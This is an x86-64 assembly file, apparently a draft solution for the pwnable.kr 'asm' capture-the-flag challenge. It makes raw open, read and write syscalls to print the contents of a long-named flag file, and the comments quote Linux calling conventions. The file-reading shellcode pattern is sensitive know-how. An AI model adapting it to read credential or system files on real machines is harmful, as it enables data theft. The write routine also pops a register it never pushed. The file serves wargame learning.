.section .text
  .globl _start

/*
* The following comments is quote from Stack Overflow.
* url; https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-i39
*
*
* User-level applications use as integer registers for passing the sequence
* %rdi, %rsi, %rdx, %rcx, %r8 and %r9.
* The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9.
*
*
* In x86-32 parameters for Linux system call are passed using registers.
* %eax for syscall_number. %ebx, %ecx, %edx, %esi, %edi, %ebp
* are used for passing 6 parameters to system calls.
*/


/*
* Quote from unistd_64.h
#define __NR_read 0$
#define __NR_write 1$
#define __NR_open 2
*/

  _start:
    call sys_open
    pushq %rax #int fd
    mov %rax, %rbx
    call sys_read
    popq %rax
    call sys_write
    ret
    #hlt



/*
* I don't know which should to select.
* int open(const char *pathname, int flags);
* int open(const char *pathname, int flags, mode_t mode);
*/
  sys_open:
    # print flag_file
    #mov $0x1, %rax
    #mov $0x1, %rdi #fd = output
    #mov $flag_file, %rsi
    #mov $0x68, %rdx
    #syscall
    
    movq $0x2, %rax # system call number
    movq $flag_file, %rdi # filename
    movq $0x0, %rsi # flag is O_RDONLY
    movq $0x0, %rdx
    #:movq %rax, %rbx
    syscall # or int $0x80
    ret



/*
* ssize_t read(int fd, void *buf, size_t count);
*/


  sys_read:
    pushq %rbp
    movq %rsp, %rbp
    xor %rax, %rax # system call number
    #movq 0x4(%rbp), %rdi # file diskripter
    movq %rbx, %rdi
    movq $buf, %rsi # buffer
    movq $0x100, %rdx
    #mov $buf_size, %rdx # buffer size
    #mov (%rdx), %rdx
    syscall
    mov %rbp, %rsp
    popq %rbp
    ret


/*
*  ssize_t write(int fd, const void *buf, size_t count);
*/
  sys_write:
    movq $0x1, %rax
    movq $0x1, %rdi #fd = output
    #movq $msg, %rsi
    movq $0x50, %rdx
    movq $buf, %rsi
    #movq $buf_size, %rdx
    #movq (%rdx), %rdx
    syscall
    popq %rbp
    ret



.section .data
  flag_file:
    .string "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
  buf_size:
    .int 0x100
  msg:
    .string "test.test"





.section .bss
  .lcomm buf, 0x100

